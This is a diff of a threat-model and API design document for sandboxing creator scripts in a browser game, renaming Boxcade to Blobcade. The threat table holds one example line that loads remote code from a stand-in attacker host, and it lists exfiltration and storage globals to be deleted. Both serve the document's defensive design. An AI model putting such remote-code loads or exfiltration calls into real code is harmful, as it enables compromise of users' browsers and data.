@@ -1,4 +1,4 @@
-# Boxcade scripting (P7) — threat model + API design
+# Blobcade scripting (P7) — threat model + API design
 
 The design and implementation contract for **creator scripting**: the escape
 hatch from the logic-block ceiling. The first implementation lives in
@@ -45,13 +45,13 @@ stops it".
 |---|---|---|---|
 | T1 | Run on the page / **XSS** | reach `window`, `document`, the engine, other scripts | Worker has a *separate global scope* — no `window`/`document`/`parent`. Code never executes on the main thread (hard non-goal §8). The host holds all engine object references; the worker gets none. |
 | T2 | **Exfiltrate** data | `fetch`, `XMLHttpRequest`, `WebSocket`, `EventSource`, `navigator.sendBeacon`, dynamic `import()` of a URL | Delete/stub these globals at worker boot. Defense-in-depth: a `Content-Security-Policy` `connect-src 'none'` (see §3 on what is actually enforceable for blob/srcdoc workers). The worker has **no network capability in the message API** — there is no "fetch" message. |
-| T3 | **Steal wallet / storage** | `localStorage`, `IndexedDB`, `caches`, `cookies` | Workers have **no `localStorage`/cookies** at all (not exposed to worker scope). `indexedDB`/`caches` are deleted at boot. The wallet (`economy.ts`) lives on the main thread and is never referenced from the worker; Bolts move only via the `award`-class capability messages the host validates (§3), capped by the rate budget (§4). |
+| T3 | **Steal wallet / storage** | `localStorage`, `IndexedDB`, `caches`, `cookies` | Workers have **no `localStorage`/cookies** at all (not exposed to worker scope). `indexedDB`/`caches` are deleted at boot. The wallet (`economy.ts`) lives on the main thread and is never referenced from the worker; Blobcash move only via the `award`-class capability messages the host validates (§3), capped by the rate budget (§4). |
 | T4 | **Infinite loop / CPU burn** | `while(true){}`, pathological regex, huge synchronous compute | CPU watchdog (§4): host pings, worker must pong within N ms or it is `terminate()`d and restarted with backoff; 3 strikes disables scripting for the session. A spinning plain Worker freezes *only its own thread*, never the render loop — that is the whole reason for the Worker. (Plain workers cannot be *interrupted* mid-loop; only killed — see §6 for QuickJS, which can.) |
 | T5 | **Memory bomb** | grow arrays/strings until the tab OOMs | No `SharedArrayBuffer` (also gated by COOP/COEP, which we do not set). Rely on `terminate()` to reclaim the worker heap. **Honest gap:** browsers expose *no* hard per-worker memory cap to JS; we cannot bound RAM in a plain worker. Watchdog catches the *symptom* (a worker that stops ponging because it is GC-thrashing) but not the cause. QuickJS (§6) closes this with a real allocation limit. |
 | T6 | **Prototype pollution toward the host** | mutate `Object.prototype` etc. to corrupt host logic | The worker's prototypes are **its own realm** — polluting them cannot reach the host realm. The wire is JSON-shaped data (structured clone), never shared objects, so a poisoned prototype does not travel. Host-side: parse messages defensively, read only own-properties, never `eval` a message field. |
 | T7 | **`postMessage` abuse** | flood the host with messages; forge message shapes; transfer hostile objects | Host validates **every** message exactly like a rule action (§3): unknown `type` dropped, fields type/range-checked, refs length-capped, action messages counted against the same rate budget as `forEveryone` rules (§4). Inbound messages are plain data (no functions/DOM survive structured clone). A message flood is itself "CPU" and trips the watchdog / rate limiter. |
 | T8 | **Timing side channels** | high-res timers + `SharedArrayBuffer` for Spectre-style reads | No `SAB` (T5) removes the high-resolution timing primitive; `performance.now()` in workers is coarsened by the browser. We do not expose any cross-origin readable buffer. This is a *browser-platform* mitigation we inherit, not one we invent — documented as a residual-risk reliance. |
-| T9 | **Phishing / UI spoofing** | draw a fake "enter your password" overlay, mimic the Boxcade chrome | Scripts have **no DOM and no drawing primitive whatsoever** — they cannot place pixels or HTML. All player-facing output goes through the *existing* HUD vocabulary (`toast`, `big`, HUD chips), which is visibly Boxcade-framed and cannot render arbitrary markup (text is set as `textContent`, never `innerHTML` — a host-side invariant to honor). A script cannot forge native browser UI. |
+| T9 | **Phishing / UI spoofing** | draw a fake "enter your password" overlay, mimic the Blobcade chrome | Scripts have **no DOM and no drawing primitive whatsoever** — they cannot place pixels or HTML. All player-facing output goes through the *existing* HUD vocabulary (`toast`, `big`, HUD chips), which is visibly Blobcade-framed and cannot render arbitrary markup (text is set as `textContent`, never `innerHTML` — a host-side invariant to honor). A script cannot forge native browser UI. |
 | T10 | **Supply chain** | `importScripts('https://evil/x.js')`, `import('https://…')`, remote `eval` | `importScripts` is **deleted** from worker scope; dynamic `import()` of a URL is blocked by the no-network stance (T2) and CSP `default-src 'none'`. The script string is fully self-contained — there is **no module/URL import mechanism, ever** (non-goal §8). Publish-side static checks flag the *tokens* (§7) as a tripwire, not as the security boundary. |
 
 The table is the contract. **The Worker isolate (T1) and host-side message
@@ -70,7 +70,7 @@ gap" (T5) or "inherited" (T8), we do not pretend to a guarantee we cannot keep.
 1. deletes the network + storage globals (`fetch`, `XMLHttpRequest`,
    `WebSocket`, `EventSource`, `importScripts`, `indexedDB`, `caches`, and any
    `navigator.sendBeacon`),
-2. installs the message-only capability shim (the `boxcade` global below),
+2. installs the message-only capability shim (the `blobcade` global below),
 3. then evaluates the creator code in that stripped scope.
 
 **CSP — what is actually enforceable (honest):** a dedicated worker created
@@ -162,7 +162,7 @@ Three independent budgets; tripping any one degrades gracefully.
 
 ## 5. The API creators see
 
-A script is a self-contained string. It sees one global, `boxcade`, mirroring
+A script is a self-contained string. It sees one global, `blobcade`, mirroring
 the rule-action vocabulary plus `onTick`/`on` hooks and the var store. No
 imports, no DOM, no globals beyond this. Sketch of a wave spawner that scales
 with the round — *expressible here, impossible in rules*:
@@ -172,30 +172,30 @@ with the round — *expressible here, impossible in rules*:
 let wave = 0
 let nextAt = 0
 
-boxcade.on('start', () => {
-  boxcade.toast('Survive the waves!')
+blobcade.on('start', () => {
+  blobcade.toast('Survive the waves!')
 })
 
-boxcade.onTick((t /* seconds */) => {
+blobcade.onTick((t /* seconds */) => {
   if (t < nextAt) return
   wave += 1
   const count = 3 + wave * 2            // arithmetic — no rule can do this
   const radius = 12 + wave              // derived geometry
   for (let i = 0; i < count; i++) {     // a loop — no rule can do this
     const a = (i / count) * Math.PI * 2
-    boxcade.spawnPart({
+    blobcade.spawnPart({
       kind: 'part', tag: 'creep',
       at: [Math.cos(a) * radius, 1, Math.sin(a) * radius],
       size: [1, 1, 1], color: '#e74c3c',
     })
   }
-  boxcade.setVar('wave', wave)          // drives the HUD chip + varReaches
-  boxcade.big('Wave ' + wave)
+  blobcade.setVar('wave', wave)          // drives the HUD chip + varReaches
+  blobcade.big('Wave ' + wave)
   nextAt = t + Math.max(2, 8 - wave)    // ramps the cadence
 })
 ```
 
-Every `boxcade.*` call is a validated `action`/`subscribe`/`setVar` message —
+Every `blobcade.*` call is a validated `action`/`subscribe`/`setVar` message —
 the script never touches an engine object. `spawnPart`/`setVar`/`big`/`toast`
 are the *same* actions a rule would emit; the script just decides *when* and
 *how many* with real control flow.
@@ -218,7 +218,7 @@ What QuickJS adds over a plain worker:
   gap honestly).
 - **No host globals at all.** The interpreter starts with *nothing* — there is
   no `fetch`/`importScripts`/`window` to delete and no risk of forgetting one
-  in the bootstrap. We add back exactly the `boxcade` shim. Removes the
+  in the bootstrap. We add back exactly the `blobcade` shim. Removes the
   "delete-the-globals could miss one" and "CSP is only inherited" weaknesses.
 - **Determinism.** Useful later for replicated/deterministic match logic.
 
@@ -231,7 +231,7 @@ not for hot numeric loops), and a build/integration step.
 sufficient for casual UGC, with the gaps documented above. Adopt **QuickJS
 behind the identical protocol** when the platform grows (untrusted scripts at
 scale, replicated logic, or the memory/interrupt gaps start biting). Because
-the wire protocol and `boxcade` API are unchanged, this is an executor swap —
+the wire protocol and `blobcade` API are unchanged, this is an executor swap —
 no creator script and no host capability code changes.
 
 ## 7. Trust UX
